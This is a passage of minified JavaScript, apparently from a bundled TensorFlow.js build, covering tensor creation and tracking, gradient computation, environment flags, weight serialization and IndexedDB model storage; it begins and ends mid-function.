                const c = s.filter(((l,u)=>i[u]));
                return a.concat(c)
            }
            return []
        }
        makeTensor(t, e, s, o) {
            if (null == t)
                throw new Error("Values passed to engine.makeTensor() are null");
            s = s || "float32",
            o = o || this.backend;
            let r = t;
            "string" === s && Cr(t[0]) && (r = t.map((c=>bs(c))));
            const i = o.write(r, e, s)
              , a = new ae(e,s,i,this.nextTensorId());
            if (this.trackTensor(a, o),
            "string" === s) {
                const c = this.state.tensorInfo.get(i)
                  , l = function nw(n) {
                    if (null == n)
                        return 0;
                    let t = 0;
                    return n.forEach((e=>t += e.length)),
                    t
                }(r);
                this.state.numBytes += l - c.bytes,
                c.bytes = l
            }
            return a
        }
        makeTensorFromDataId(t, e, s, o) {
            const r = {
                dataId: t,
                shape: e,
                dtype: s = s || "float32"
            };
            return this.makeTensorFromTensorInfo(r, o)
        }
        makeTensorFromTensorInfo(t, e) {
            const {dataId: s, shape: o, dtype: r} = t
              , i = new ae(o,r,s,this.nextTensorId());
            return this.trackTensor(i, e),
            i
        }
        makeVariable(t, e=!0, s, o) {
            s = s || this.nextVariableId().toString(),
            null != o && o !== t.dtype && (t = t.cast(o));
            const r = new Tc(t,e,s,this.nextTensorId());
            if (null != this.state.registeredVariables[r.name])
                throw new Error(`Variable with name ${r.name} was already registered`);
            return this.state.registeredVariables[r.name] = r,
            this.incRef(r, this.backend),
            r
        }
        trackTensor(t, e) {
            this.state.numTensors++,
            "string" === t.dtype && this.state.numStringTensors++;
            let s = 0;
            "complex64" !== t.dtype && "string" !== t.dtype && (s = t.size * xa(t.dtype)),
            this.state.numBytes += s,
            this.state.tensorInfo.has(t.dataId) || (this.state.numDataBuffers++,
            this.state.tensorInfo.set(t.dataId, {
                backend: e || this.backend,
                dtype: t.dtype,
                shape: t.shape,
                bytes: s
            })),
            t instanceof Tc || this.track(t)
        }
        incRef(t, e) {
            this.trackTensor(t, e),
            this.backend.incRef(t.dataId)
        }
        removeDataId(t, e) {
            this.state.tensorInfo.has(t) && this.state.tensorInfo.get(t).backend === e && (this.state.tensorInfo.delete(t),
            this.state.numDataBuffers--)
        }
        disposeTensor(t) {
            if (!this.state.tensorInfo.has(t.dataId))
                return;
            const e = this.state.tensorInfo.get(t.dataId);
            if (this.state.numTensors--,
            "string" === t.dtype && (this.state.numStringTensors--,
            this.state.numBytes -= e.bytes),
            "complex64" !== t.dtype && "string" !== t.dtype) {
                const s = t.size * xa(t.dtype);
                this.state.numBytes -= s
            }
            e.backend.disposeData(t.dataId) && this.removeDataId(t.dataId, e.backend)
        }
        disposeVariables() {
            for (const t in this.state.registeredVariables) {
                const e = this.state.registeredVariables[t];
                this.disposeVariable(e)
            }
        }
        disposeVariable(t) {
            this.disposeTensor(t),
            null != this.state.registeredVariables[t.name] && delete this.state.registeredVariables[t.name]
        }
        memory() {
            const t = this.backend.memory();
            return t.numTensors = this.state.numTensors,
            t.numDataBuffers = this.state.numDataBuffers,
            t.numBytes = this.state.numBytes,
            this.state.numStringTensors > 0 && (t.unreliable = !0,
            null == t.reasons && (t.reasons = []),
            t.reasons.push("Memory usage by string tensors is approximate (2 bytes per character)")),
            t
        }
        async profile(t) {
            this.state.profiling = !0;
            const e = this.state.numBytes
              , s = this.state.numTensors;
            this.state.activeProfile.kernels = [],
            this.state.activeProfile.result = await t(),
            this.state.profiling = !1,
            this.state.activeProfile.peakBytes = Math.max(...this.state.activeProfile.kernels.map((o=>o.totalBytesSnapshot))),
            this.state.activeProfile.newBytes = this.state.numBytes - e,
            this.state.activeProfile.newTensors = this.state.numTensors - s;
            for (const o of this.state.activeProfile.kernels)
                o.kernelTimeMs = await o.kernelTimeMs,
                o.extraInfo = await o.extraInfo;
            return this.state.activeProfile
        }
        isTapeOn() {
            return this.state.gradientDepth > 0 && 0 === this.state.kernelDepth
        }
        addTapeNode(t, e, s, o, r, i) {
            const a = {
                id: this.state.nextTapeNodeId++,
                kernelName: t,
                inputs: e,
                outputs: s,
                saved: r
            }
              , c = Xf(t);
            null != c && (o = c.gradFunc),
            null != o && (a.gradient = l=>(l = l.map(((u,d)=>{
                if (null == u) {
                    const h = s[d]
                      , p = ke(h.size, h.dtype);
                    return this.makeTensor(p, h.shape, h.dtype)
                }
                return u
            }
            )),
            o(l.length > 1 ? l : l[0], r, i))),
            this.state.activeTape.push(a)
        }
        keep(t) {
            return t.kept = !0,
            t
        }
        startTape() {
            0 === this.state.gradientDepth && (this.state.activeTape = []),
            this.state.gradientDepth++
        }
        endTape() {
            this.state.gradientDepth--
        }
        startScope(t) {
            const e = {
                track: [],
                name: "unnamed scope",
                id: this.state.nextScopeId++
            };
            t && (e.name = t),
            this.state.scopeStack.push(e),
            this.state.activeScope = e
        }
        endScope(t) {
            const e = cm(t)
              , s = new Set(e.map((r=>r.id)));
            for (let r = 0; r < this.state.activeScope.track.length; r++) {
                const i = this.state.activeScope.track[r];
                !i.kept && !s.has(i.id) && i.dispose()
            }
            const o = this.state.scopeStack.pop();
            this.state.activeScope = 0 === this.state.scopeStack.length ? null : this.state.scopeStack[this.state.scopeStack.length - 1],
            e.forEach((r=>{
                !r.kept && r.scopeId === o.id && this.track(r)
            }
            ))
        }
        gradients(t, e, s, o=!1) {
            if (v(e.length > 0, (()=>"gradients() received an empty list of xs.")),
            null != s && "float32" !== s.dtype)
                throw new Error(`dy must have 'float32' dtype, but has '${s.dtype}'`);
            const r = this.scopedRun((()=>this.startTape()), (()=>this.endTape()), (()=>this.tidy("forward", t)));
            v(r instanceof ae, (()=>"The result y returned by f() must be a tensor."));
            const i = function $w(n, t, e) {
                const s = {}
                  , o = {};
                for (let c = 0; c < t.length; c++)
                    s[t[c].id] = !0;
                for (let c = 0; c < n.length; c++) {
                    const l = n[c]
                      , u = l.inputs;
                    for (const d in u) {
                        const h = u[d];
                        let p = !1;
                        for (let f = 0; f < t.length; f++)
                            if (s[h.id]) {
                                l.outputs.forEach((m=>s[m.id] = !0)),
                                p = !0,
                                o[l.id] = !0;
                                break
                            }
                        if (p)
                            break
                    }
                }
                const r = {};
                r[e.id] = !0;
                const i = {};
                for (let c = n.length - 1; c >= 0; c--) {
                    const l = n[c]
                      , u = l.inputs;
                    for (let d = 0; d < l.outputs.length; d++)
                        if (r[l.outputs[d].id]) {
                            for (const h in u)
                                r[u[h].id] = !0,
                                i[l.id] = !0;
                            break
                        }
                }
                const a = [];
                for (let c = 0; c < n.length; c++) {
                    const l = n[c];
                    if (o[l.id] && i[l.id]) {
                        const u = {};
                        for (const h in l.inputs) {
                            const p = l.inputs[h];
                            s[p.id] && (u[h] = p)
                        }
                        const d = Object.assign({}, l);
                        d.inputs = u,
                        d.outputs = l.outputs,
                        a.push(d)
                    }
                }
                return a
            }(this.state.activeTape, e, r);
            if (!o && 0 === i.length && e.length > 0)
                throw new Error("Cannot compute gradient of y=f(x) with respect to x. Make sure that the f you passed encloses all operations that lead from x to y.");
            return this.tidy("backward", (()=>{
                const a = {};
                a[r.id] = s ?? function Fw(n) {
                    const t = jl(Z(n), "float32");
                    return G.makeTensor(t, n, "float32")
                }(r.shape),
                function Gw(n, t, e, s) {
                    for (let o = t.length - 1; o >= 0; o--) {
                        const r = t[o]
                          , i = [];
                        if (r.outputs.forEach((c=>{
                            const l = n[c.id];
                            null != l ? i.push(l) : i.push(null)
                        }
                        )),
                        null == r.gradient)
                            throw new Error(`Cannot compute gradient: gradient function not found for ${r.kernelName}.`);
                        const a = r.gradient(i);
                        for (const c in r.inputs) {
                            if (!(c in a))
                                throw new Error(`Cannot backprop through input ${c}. Available gradients found: ${Object.keys(a)}.`);
                            const l = e((()=>a[c]()));
                            if ("float32" !== l.dtype)
                                throw new Error(`Error in gradient for op ${r.kernelName}. The gradient of input ${c} must have 'float32' dtype, but has '${l.dtype}'`);
                            const u = r.inputs[c];
                            if (!Rt(l.shape, u.shape))
                                throw new Error(`Error in gradient for op ${r.kernelName}. The gradient of input '${c}' has shape '${l.shape}', which does not match the shape of the input '${u.shape}'`);
                            if (null == n[u.id])
                                n[u.id] = l;
                            else {
                                const d = n[u.id];
                                n[u.id] = s(d, l),
                                d.dispose()
                            }
                        }
                    }
                }(a, i, (l=>this.tidy(l)), zw);
                const c = e.map((l=>a[l.id]));
                return 0 === this.state.gradientDepth && (this.state.activeTape.forEach((l=>{
                    for (const u of l.saved)
                        u.dispose()
                }
                )),
                this.state.activeTape = null),
                {
                    value: r,
                    grads: c
                }
            }
            ))
        }
        customGrad(t) {
            return v(Ql(t), (()=>"The f passed in customGrad(f) must be a function.")),
            (...e)=>{
                let s;
                v(e.every((a=>a instanceof ae)), (()=>"The args passed in customGrad(f)(x1, x2,...) must all be tensors"));
                const o = {};
                e.forEach(((a,c)=>{
                    o[c] = a
                }
                ));
                return this.runKernelFunc({
                    forwardFunc: (a,c)=>(s = t(...e, c),
                    v(s.value instanceof ae, (()=>"The function f passed in customGrad(f) must return an object where `obj.value` is a tensor")),
                    v(Ql(s.gradFunc), (()=>"The function f passed in customGrad(f) must return an object where `obj.gradFunc` is a function.")),
                    s.value),
                    backwardsFunc: (a,c)=>{
                        const l = s.gradFunc(a, c)
                          , u = Array.isArray(l) ? l : [l];
                        v(u.length === e.length, (()=>"The function f passed in customGrad(f) must return an object where `obj.gradFunc` is a function that returns the same number of tensors as inputs passed to f(...).")),
                        v(u.every((h=>h instanceof ae)), (()=>"The function f passed in customGrad(f) must return an object where `obj.gradFunc` is a function that returns a list of only tensors."));
                        const d = {};
                        return u.forEach(((h,p)=>{
                            d[p] = ()=>h
                        }
                        )),
                        d
                    }
                    ,
                    inputs: o
                })
            }
        }
        readSync(t) {
            return this.state.tensorInfo.get(t).backend.readSync(t)
        }
        read(t) {
            return this.state.tensorInfo.get(t).backend.read(t)
        }
        readToGPU(t, e) {
            return this.state.tensorInfo.get(t).backend.readToGPU(t, e)
        }
        async time(t) {
            const e = Ve()
              , s = await this.backend.time(t);
            return s.wallMs = Ve() - e,
            s
        }
        track(t) {
            return null != this.state.activeScope && (t.scopeId = this.state.activeScope.id,
            this.state.activeScope.track.push(t)),
            t
        }
        get registeredVariables() {
            return this.state.registeredVariables
        }
        reset() {
            this.pendingBackendInitId++,
            this.state.dispose(),
            this.ENV.reset(),
            this.state = new um;
            for (const t in this.registry)
                this.disposeRegisteredKernels(t),
                this.registry[t].dispose(),
                delete this.registry[t];
            this.backendName = null,
            this.backendInstance = null,
            this.pendingBackendInit = null
        }
    }
    function dm() {
        const n = bf();
        if (null == n._tfengine) {
            const t = new rw(n);
            n._tfengine = new Oo(t)
        }
        return function lw(n) {
            gf = n
        }(n._tfengine.ENV),
        function Dw(n) {
            kn = n
        }((()=>n._tfengine)),
        n._tfengine
    }
    Oo.nextTensorId = 0,
    Oo.nextVariableId = 0;
    const G = dm();
    function zw(n, t) {
        const e = {
            a: n,
            b: t
        };
        return G.runKernel(Fo, e)
    }
    function hm(n) {
        if (n || function Xw() {
            return typeof navigator < "u" && null != navigator
        }()) {
            if (n || (n = navigator),
            "ReactNative" === n.product)
                return !0;
            const t = n.userAgent || n.vendor || (typeof window < "u" ? window.opera : "");
            if (!t) {
                const e = n;
                return e.userAgentData && e.userAgentData.mobile
            }
            return /(android|bb\d+|meego).+mobile|avantgo|bada\/|blackberry|blazer|compal|elaine|fennec|hiptop|iemobile|ip(hone|od)|iris|kindle|lge |maemo|midp|mmp|mobile.+firefox|netfront|opera m(ob|in)i|palm( os)?|phone|p(ixi|re)\/|plucker|pocket|psp|series(4|6)0|symbian|treo|up\.(browser|link)|vodafone|wap|windows ce|xda|xiino/i.test(t) || /1207|6310|6590|3gso|4thp|50[1-6]i|770s|802s|a wa|abac|ac(er|oo|s\-)|ai(ko|rn)|al(av|ca|co)|amoi|an(ex|ny|yw)|aptu|ar(ch|go)|as(te|us)|attw|au(di|\-m|r |s )|avan|be(ck|ll|nq)|bi(lb|rd)|bl(ac|az)|br(e|v)w|bumb|bw\-(n|u)|c55\/|capi|ccwa|cdm\-|cell|chtm|cldc|cmd\-|co(mp|nd)|craw|da(it|ll|ng)|dbte|dc\-s|devi|dica|dmob|do(c|p)o|ds(12|\-d)|el(49|ai)|em(l2|ul)|er(ic|k0)|esl8|ez([4-7]0|os|wa|ze)|fetc|fly(\-|_)|g1 u|g560|gene|gf\-5|g\-mo|go(\.w|od)|gr(ad|un)|haie|hcit|hd\-(m|p|t)|hei\-|hi(pt|ta)|hp( i|ip)|hs\-c|ht(c(\-| |_|a|g|p|s|t)|tp)|hu(aw|tc)|i\-(20|go|ma)|i230|iac( |\-|\/)|ibro|idea|ig01|ikom|im1k|inno|ipaq|iris|ja(t|v)a|jbro|jemu|jigs|kddi|keji|kgt( |\/)|klon|kpt |kwc\-|kyo(c|k)|le(no|xi)|lg( g|\/(k|l|u)|50|54|\-[a-w])|libw|lynx|m1\-w|m3ga|m50\/|ma(te|ui|xo)|mc(01|21|ca)|m\-cr|me(rc|ri)|mi(o8|oa|ts)|mmef|mo(01|02|bi|de|do|t(\-| |o|v)|zz)|mt(50|p1|v )|mwbp|mywa|n10[0-2]|n20[2-3]|n30(0|2)|n50(0|2|5)|n7(0(0|1)|10)|ne((c|m)\-|on|tf|wf|wg|wt)|nok(6|i)|nzph|o2im|op(ti|wv)|oran|owg1|p800|pan(a|d|t)|pdxg|pg(13|\-([1-8]|c))|phil|pire|pl(ay|uc)|pn\-2|po(ck|rt|se)|prox|psio|pt\-g|qa\-a|qc(07|12|21|32|60|\-[2-7]|i\-)|qtek|r380|r600|raks|rim9|ro(ve|zo)|s55\/|sa(ge|ma|mm|ms|ny|va)|sc(01|h\-|oo|p\-)|sdk\/|se(c(\-|0|1)|47|mc|nd|ri)|sgh\-|shar|sie(\-|m)|sk\-0|sl(45|id)|sm(al|ar|b3|it|t5)|so(ft|ny)|sp(01|h\-|v\-|v )|sy(01|mb)|t2(18|50)|t6(00|10|18)|ta(gt|lk)|tcl\-|tdg\-|tel(i|m)|tim\-|t\-mo|to(pl|sh)|ts(70|m\-|m3|m5)|tx\-9|up(\.b|g1|si)|utst|v400|v750|veri|vi(rg|te)|vk(40|5[0-3]|\-v)|vm40|voda|vulc|vx(52|53|60|61|70|80|81|83|85|98)|w3c(\-| )|webc|whit|wi(g |nc|nw)|wmlb|wonu|x700|yas\-|your|zeto|zte\-/i.test(t.substr(0, 4))
        }
        return !1
    }
    function pm() {
        return typeof window < "u" && null != window.document || typeof WorkerGlobalScope < "u"
    }
    const Fe = z();
    function wi(n, t) {
        let e = n;
        if (hn(n))
            return "string" === t ? [] : [n.length];
        if (im(n)) {
            const o = n.channels || "RGBA";
            return [n.height, n.width * o.length]
        }
        if (am(n))
            return [n.buffer.size / (null == t ? 4 : xa(t))];
        if (!Array.isArray(n))
            return [];
        const s = [];
        for (; Array.isArray(e) || hn(e) && "string" !== t; )
            s.push(e.length),
            e = e[0];
        return Array.isArray(n) && z().getBool("TENSORLIKE_CHECK_SHAPE_CONSISTENCY") && fm(n, s, []),
        s
    }
    function fm(n, t, e) {
        if (e = e || [],
        !Array.isArray(n) && !hn(n))
            return void v(0 === t.length, (()=>`Element arr[${e.join("][")}] is a primitive, but should be an array/TypedArray of ${t[0]} elements`));
        v(t.length > 0, (()=>`Element arr[${e.join("][")}] should be a primitive, but is an array of ${n.length} elements`)),
        v(n.length === t[0], (()=>`Element arr[${e.join("][")}] should have ${t[0]} elements, but has ${n.length} elements`));
        const s = t.slice(1);
        for (let o = 0; o < n.length; ++o)
            fm(n[o], s, e.concat(o))
    }
    function mm(n, t, e, s) {
        if ("string_or_numeric" !== n) {
            if (null == n)
                throw new Error("Expected dtype cannot be null.");
            if ("numeric" !== n && n !== t || "numeric" === n && "string" === t)
                throw new Error(`Argument '${e}' passed to '${s}' must be ${n} tensor, but got ${t} tensor`)
        }
    }
    function N(n, t, e, s="numeric") {
        if (n instanceof O())
            return mm(s, n.dtype, t, e),
            n;
        let o = Mo(n);
        if ("string" !== o && ["bool", "int32", "float32"].indexOf(s) >= 0 && (o = s),
        mm(s, o, t, e),
        null == n || !hn(n) && !Array.isArray(n) && "number" != typeof n && "boolean" != typeof n && "string" != typeof n) {
            const c = null == n ? "null" : n.constructor.name;
            throw new Error(`Argument '${t}' passed to '${e}' must be a Tensor or TensorLike, but got '${c}'`)
        }
        const r = wi(n, o);
        !hn(n) && !Array.isArray(n) && (n = [n]);
        const a = "string" !== o ? Ys(n, o) : Qs(n, [], !0);
        return G.makeTensor(a, r, o)
    }
    function gm(n, t, e, s="numeric") {
        if (!Array.isArray(n))
            throw new Error(`Argument ${t} passed to ${e} must be a \`Tensor[]\` or \`TensorLike[]\``);
        return n.map(((r,i)=>N(r, `${t}[${i}]`, e, s)))
    }
    Fe.registerFlag("DEBUG", (()=>!1), (n=>{
        n && console.warn("Debugging mode is ON. The output of every math call will be downloaded to CPU and checked for NaNs. This significantly impacts performance.")
    }
    )),
    Fe.registerFlag("IS_BROWSER", (()=>pm())),
    Fe.registerFlag("IS_NODE", (()=>typeof process < "u" && typeof process.versions < "u" && typeof process.versions.node < "u")),
    Fe.registerFlag("IS_CHROME", (()=>typeof navigator < "u" && null != navigator && null != navigator.userAgent && /Chrome/.test(navigator.userAgent) && /Google Inc/.test(navigator.vendor))),
    Fe.registerFlag("IS_SAFARI", (()=>typeof navigator < "u" && null != navigator && null != navigator.userAgent && /Safari/.test(navigator.userAgent) && /Apple/.test(navigator.vendor))),
    Fe.registerFlag("PROD", (()=>!1)),
    Fe.registerFlag("TENSORLIKE_CHECK_SHAPE_CONSISTENCY", (()=>Fe.getBool("DEBUG"))),
    Fe.registerFlag("DEPRECATION_WARNINGS_ENABLED", (()=>!0)),
    Fe.registerFlag("IS_TEST", (()=>!1)),
    Fe.registerFlag("CHECK_COMPUTATION_FOR_ERRORS", (()=>Fe.getBool("DEBUG"))),
    Fe.registerFlag("WRAP_TO_IMAGEBITMAP", (()=>!1)),
    Fe.registerFlag("CANVAS2D_WILL_READ_FREQUENTLY_FOR_GPU", (()=>!1)),
    Fe.registerFlag("USE_SETTIMEOUTCUSTOM", (()=>!1));
    function D(n) {
        const t = Object.keys(n);
        if (1 !== t.length)
            throw new Error(`Please provide an object with a single key (operation name) mapping to a function. Got an object with ${t.length} keys.`);
        let e = t[0];
        const s = n[e];
        e.endsWith("_") && (e = e.substring(0, e.length - 1)),
        e += "__op";
        const o = (...r)=>{
            G.startScope(e);
            try {
                const i = s(...r);
                return ql(i) && console.error("Cannot return a Promise inside of tidy."),
                G.endScope(i),
                i
            } catch (i) {
                throw G.endScope(null),
                i
            }
        }
        ;
        return Object.defineProperty(o, "name", {
            value: e,
            configurable: !0
        }),
        o
    }
    const Ko = D({
        complex_: function Pw(n, t) {
            const e = N(n, "real", "complex")
              , s = N(t, "imag", "complex");
            Hl(e.shape, s.shape, `real and imag shapes, ${e.shape} and ${s.shape}, must match in call to tf.complex().`);
            const o = {
                real: e,
                imag: s
            };
            return G.runKernel(lu, o)
        }
    });
    function Ci(n, t, e, s) {
        if (null == s)
            s = Mo(n);
        else if ("complex64" === s)
            throw new Error("Cannot construct a complex64 tensor directly. Please use tf.complex(real, imag).");
        if (am(n) || im(n)) {
            if ("float32" !== s && "int32" !== s)
                throw new Error(`Creating tensor from GPU data only supports 'float32'|'int32' dtype, while the dtype is ${s}.`);
            return G.backend.createTensorFromGPUData(n, t || e, s)
        }
        if (!hn(n) && !Array.isArray(n) && "number" != typeof n && "boolean" != typeof n && "string" != typeof n)
            throw new Error("values passed to tensor(values) must be a number/boolean/string or an array of numbers/booleans/strings, or a TypedArray");
        if (null != t) {
            es(t);
            const o = Z(t)
              , r = Z(e);
            v(o === r, (()=>`Based on the provided shape, [${t}], the tensor should have ${o} values but has ${r}`));
            for (let i = 0; i < e.length; ++i) {
                const a = e[i]
                  , c = i !== e.length - 1 || a !== Z(t.slice(i));
                v(e[i] === t[i] || !c, (()=>`Error creating a new Tensor. Inferred shape (${e}) does not match the provided shape (${t}). `))
            }
        }
        return !hn(n) && !Array.isArray(n) && (n = [n]),
        t = t || e,
        n = "string" !== s ? Ys(n, s) : Qs(n, [], !0),
        G.makeTensor(n, t, s)
    }
    function tn(n, t, e) {
        return Ci(n, t, wi(n, e), e)
    }
    class Zo {
        static join(t) {
            return new Zo(t).slice()
        }
        constructor(t) {
            if (this.shards = [],
            this.previousShardIndex = 0,
            null == t || (t instanceof Array || (t = [t]),
            0 === (t = t.map((s=>hn(s) ? s.buffer : s))).length))
                return;
            this.bufferUniformSize = t[0].byteLength;
            let e = 0;
            for (let s = 0; s < t.length; s++) {
                const o = t[s];
                s !== t.length - 1 && o.byteLength !== this.bufferUniformSize && (this.bufferUniformSize = void 0);
                const r = e + o.byteLength;
                this.shards.push({
                    buffer: o,
                    start: e,
                    end: r
                }),
                e = r
            }
            0 === this.shards.length && (this.byteLength = 0),
            this.byteLength = this.shards[this.shards.length - 1].end
        }
        slice(t=0, e=this.byteLength) {
            if (0 === this.shards.length)
                return new ArrayBuffer(0);
            if (t = isNaN(Number(t)) ? 0 : t,
            e = isNaN(Number(e)) ? 0 : e,
            t = Math.max(0, t),
            (e = Math.min(this.byteLength, e)) <= t)
                return new ArrayBuffer(0);
            const s = this.findShardForByte(t);
            if (-1 === s)
                throw new Error(`Could not find start shard for byte ${t}`);
            const r = new ArrayBuffer(e - t)
              , i = new Uint8Array(r);
            let a = 0;
            for (let c = s; c < this.shards.length; c++) {
                const l = this.shards[c]
                  , d = t + a - l.start
                  , h = a
                  , f = Math.min(e, l.end) - l.start
                  , m = new Uint8Array(l.buffer,d,f - d);
                if (i.set(m, h),
                a += m.length,
                e < l.end)
                    break
            }
            return r
        }
        findShardForByte(t) {
            if (0 === this.shards.length || t < 0 || t >= this.byteLength)
                return -1;
            if (null != this.bufferUniformSize)
                return this.previousShardIndex = Math.floor(t / this.bufferUniformSize),
                this.previousShardIndex;
            function e(o) {
                return t < o.start ? -1 : t >= o.end ? 1 : 0
            }
            if (0 === e(this.shards[this.previousShardIndex]))
                return this.previousShardIndex;
            const s = function Ow(n, t) {
                let e = 0
                  , s = n.length;
                for (; e <= s; ) {
                    const o = Math.floor((s - e) / 2) + e
                      , r = t(n[o]);
                    if (0 === r)
                        return o;
                    r < 0 ? s = o : e = o + 1
                }
                return -1
            }(this.shards, e);
            return -1 === s ? -1 : (this.previousShardIndex = s,
            this.previousShardIndex)
        }
    }
    function zt() {
        return G
    }
    function Nc() {
        return G.memory()
    }
    function M(n, t) {
        return G.tidy(n, t)
    }
    function vt(n) {
        cm(n).forEach((e=>e.dispose()))
    }
    function en(n) {
        return G.keep(n)
    }
    function bm(n, t, e=1) {
        return G.registerBackend(n, t, e)
    }
    function ys() {
        return G.backend
    }
    async function ym(n, t) {
        const e = []
          , s = []
          , o = Array.isArray(n) ? n.map((i=>i.name)) : Object.keys(n);
        for (let i = 0; i < o.length; ++i) {
            const a = o[i]
              , c = Array.isArray(n) ? n[i].tensor : n[a];
            if ("float32" !== c.dtype && "int32" !== c.dtype && "bool" !== c.dtype && "string" !== c.dtype && "complex64" !== c.dtype)
                throw new Error(`Unsupported dtype in weight '${a}': ${c.dtype}`);
            const l = {
                name: a,
                shape: c.shape,
                dtype: c.dtype
            };
            if ("string" === c.dtype) {
                const u = new Promise((async d=>{
                    const h = await c.bytes()
                      , p = h.reduce(((g,b)=>g + b.length), 0) + 4 * h.length
                      , f = new Uint8Array(p);
                    let m = 0;
                    for (let g = 0; g < h.length; g++) {
                        const b = h[g]
                          , x = new Uint8Array(new Uint32Array([b.length]).buffer);
                        f.set(x, m),
                        m += 4,
                        f.set(b, m),
                        m += b.length
                    }
                    d(f)
                }
                ));
                s.push(u)
            } else
                s.push(c.data());
            null != t && (l.group = t),
            e.push(l)
        }
        return {
            data: Kw(await Promise.all(s)),
            specs: e
        }
    }
    function Kw(n) {
        if (null === n)
            throw new Error(`Invalid input value: ${JSON.stringify(n)}`);
        let t = 0;
        const e = [];
        n.forEach((r=>{
            if (t += r.byteLength,
            e.push(r.byteLength === r.buffer.byteLength ? r : new r.constructor(r)),
            !(r instanceof Float32Array || r instanceof Int32Array || r instanceof Uint8Array))
                throw new Error(`Unsupported TypedArray subtype: ${r.constructor.name}`)
        }
        ));
        const s = new Uint8Array(t);
        let o = 0;
        return e.forEach((r=>{
            s.set(new Uint8Array(r.buffer), o),
            o += r.byteLength
        }
        )),
        s.buffer
    }
    const od = typeof Buffer < "u" && (typeof Blob > "u" || typeof atob > "u" || typeof btoa > "u");
    function Im(n) {
        return od ? Buffer.byteLength(n, "utf8") : new Blob([n]).size
    }
    function wm(n) {
        if (n.modelTopology instanceof ArrayBuffer)
            throw new Error("Expected JSON model topology, received ArrayBuffer.");
        return {
            dateSaved: new Date,
            modelTopologyType: "JSON",
            modelTopologyBytes: null == n.modelTopology ? 0 : Im(JSON.stringify(n.modelTopology)),
            weightSpecsBytes: null == n.weightSpecs ? 0 : Im(JSON.stringify(n.weightSpecs)),
            weightDataBytes: null == n.weightData ? 0 : new Zo(n.weightData).byteLength
        }
    }
    class $e {
        constructor() {
            this.saveRouters = [],
            this.loadRouters = []
        }
        static getInstance() {
            return null == $e.instance && ($e.instance = new $e),
            $e.instance
        }
        static registerSaveRouter(t) {
            $e.getInstance().saveRouters.push(t)
        }
        static registerLoadRouter(t) {
            $e.getInstance().loadRouters.push(t)
        }
        static getSaveHandlers(t) {
            return $e.getHandlers(t, "save")
        }
        static getLoadHandlers(t, e) {
            return $e.getHandlers(t, "load", e)
        }
        static getHandlers(t, e, s) {
            const o = [];
            return ("load" === e ? $e.getInstance().loadRouters : $e.getInstance().saveRouters).forEach((i=>{
                const a = i(t, s);
                null !== a && o.push(a)
            }
            )),
            o
        }
    }
    const rd = "tensorflowjs"
      , Js = "models_store"
      , Is = "model_info_store";
    function Cm() {
        if (!z().getBool("IS_BROWSER"))
            throw new Error("Failed to obtain IndexedDB factory because the current environmentis not a web browser.");
        const n = typeof window > "u" ? self : window
          , t = n.indexedDB || n.mozIndexedDB || n.webkitIndexedDB || n.msIndexedDB || n.shimIndexedDB;
        if (null == t)
            throw new Error("The current browser does not appear to support IndexedDB.");
        return t
    }
    function ad(n) {
        const t = n.result;
        t.createObjectStore(Js, {
            keyPath: "modelPath"
        }),
        t.createObjectStore(Is, {
            keyPath: "modelPath"
        })
    }
    class js {
        constructor(t) {
            if (this.indexedDB = Cm(),
            null == t || !t)
                throw new Error("For IndexedDB, modelPath must not be null, undefined or empty.");
            this.modelPath = t
        }
        async save(t) {
            if (t.modelTopology instanceof ArrayBuffer)
                throw new Error("BrowserLocalStorage.save() does not support saving model topology in binary formats yet.");
            return this.databaseAction(this.modelPath, t)
        }
        async load() {
            return this.databaseAction(this.modelPath)
        }
        databaseAction(t, e) {
            return new Promise(((s,o)=>{
                const r = this.indexedDB.open(rd, 1);
                r.onupgradeneeded = ()=>ad(r),
                r.onsuccess = ()=>{
                    const i = r.result;
                    if (null == e) {
                        const a = i.transaction(Js, "readonly")
                          , l = a.objectStore(Js).get(this.modelPath);
                        l.onsuccess = ()=>{
                            if (null == l.result)
                                return i.close(),
                                o(new Error(`Cannot find model with path '${this.modelPath}' in IndexedDB.`));
                            s(l.result.modelArtifacts)
                        }
                        ,
                        l.onerror = u=>(i.close(),
                        o(l.error)),
                        a.oncomplete = ()=>i.close()
                    } else {
                        e.weightData = Zo.join(e.weightData);
                        const a = wm(e)
                          , c = i.transaction(Is, "readwrite");
                        let u, d, l = c.objectStore(Is);
                        try {
                            u = l.put({
                                modelPath: this.modelPath,
                                modelArtifactsInfo: a
                            })
                        } catch (h) {
                            return o(h)
                        }
                        u.onsuccess = ()=>{
                            d = i.transaction(Js, "readwrite");
                            const h = d.objectStore(Js);
                            let p;
                            try {
                                p = h.put({
                                    modelPath: this.modelPath,
                                    modelArtifacts: e,
                                    modelArtifactsInfo: a
                                })
                            } catch (f) {
                                return o(f)
                            }
                            p.onsuccess = ()=>s({
                                modelArtifactsInfo: a
                            }),
                            p.onerror = f=>{
                                l = c.objectStore(Is);
                                const m = l.delete(this.modelPath);
                                m.onsuccess = ()=>(i.close(),
                                o(p.error)),
                                m.onerror = g=>(i.close(),
                                o(p.error))
                            }
                        }
                        ,
                        u.onerror = h=>(i.close(),
                        o(u.error)),
                        c.oncomplete = ()=>{
                            null == d ? i.close() : d.oncomplete = ()=>i.close()
                        }
                    }
                }
                ,
                r.onerror = i=>o(r.error)
            }
            ))
        }
    }
    js.URL_SCHEME = "indexeddb://";
    const vm = n=>z().getBool("IS_BROWSER") && !Array.isArray(n) && n.startsWith(js.URL_SCHEME) ? function Uw(n) {
        return new js(n)
    }(n.slice(js.URL_SCHEME.length)) : null;
    $e.registerSaveRouter(vm),
    $e.registerLoadRouter(vm);
    class Qw {
        constructor() {
            this.indexedDB = Cm()
        }
        async listModels() {
            return new Promise(((t,e)=>{
                const s = this.indexedDB.open(rd, 1);
                s.onupgradeneeded = ()=>ad(s),
                s.onsuccess = ()=>{
                    const o = s.result
                      , r = o.transaction(Is, "readonly")
                      , a = r.objectStore(Is).getAll();
                    a.onsuccess = ()=>{
                        const c = {};
                        for (const l of a.result)
                            c[l.modelPath] = l.modelArtifactsInfo;
                        t(c)
                    }
                    ,
                    a.onerror = c=>(o.close(),
                    e(a.error)),
                    r.oncomplete = ()=>o.close()
                }
                ,
                s.onerror = o=>e(s.error)
            }
            ))
        }
        async removeModel(t) {
            return t = function Yw(n) {
                return n.startsWith(js.URL_SCHEME) ? n.slice(js.URL_SCHEME.length) : n
            }(t),
            new Promise(((e,s)=>{
                const o = this.indexedDB.open(rd, 1);
                o.onupgradeneeded = ()=>ad(o),
                o.onsuccess = ()=>{
                    const r = o.result
                      , i = r.transaction(Is, "readwrite")
                      , a = i.objectStore(Is)
                      , c = a.get(t);
